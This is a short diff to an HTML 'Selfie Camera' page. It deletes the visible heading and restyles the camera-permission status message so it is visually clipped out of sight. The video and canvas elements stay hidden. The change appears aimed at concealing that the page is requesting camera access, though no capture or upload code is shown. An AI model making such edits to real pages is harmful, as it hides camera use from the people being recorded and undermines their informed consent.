@@ -5,12 +5,11 @@
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Selfie Camera</title>
 <style>
-body{font-family:Arial,sans-serif;background:#111;color:#fff;text-align:center;margin:0;padding:24px}
-#status{margin:16px 0}
+body{margin:0;padding:0;background:#111}
+#status{position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0 0 0 0)}
 </style>
 </head>
 <body>
-<h2>Selfie Camera</h2>
 <div id="status">Requesting camera permission…</div>
 <video id="video" autoplay playsinline muted hidden></video>
 <canvas id="canvas" hidden></canvas>
